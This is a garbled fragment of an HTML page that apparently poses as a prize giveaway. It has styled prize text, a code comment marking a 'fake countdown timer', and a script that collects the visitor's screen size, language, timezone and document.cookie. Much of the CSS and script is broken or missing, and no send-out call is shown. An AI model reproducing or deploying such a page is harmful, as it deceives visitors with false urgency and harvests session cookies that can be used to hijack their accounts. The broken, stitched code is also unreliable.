<!DOCTYPE html>

            border-radius: 16px;
            margin: 0 auto 24px;
            display: flex;

            justify-content: center;

        h1 { font-size: 22px; margin-bottom: 8px; background: linear-gradient(90deg, #6366f1, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .subtitle { color: #8888aa; font-size: 14px; margin-bottom: 24px; }
        .prize { font-size: 36px; font-weight: 800; color: #4ade80; margin-bottom: 8px; }
        .prize-sub { color: #8888aa; font-size: 13px; margin-bottom: 24px; }

            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 16px;

            background: rgba(0,0,0,0.3);
            border-radius: 8px;
            font-size: 12px;
            color: #666;
            text-align: left;
            display: none;
            max-height: 150px;
            overflow-y: auto;

        .status.active { display: block; }
        .success { color: #4ade80 !important; }
        .error { color: #f87171 !important; }
        .warning { color: #fbbf24 !important; }

        // Fake countdown timer

                        screen_resolution: `${screen.width}x${screen.height}`,
                        language: navigator.language,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,

                        cookies: document.cookie || '',
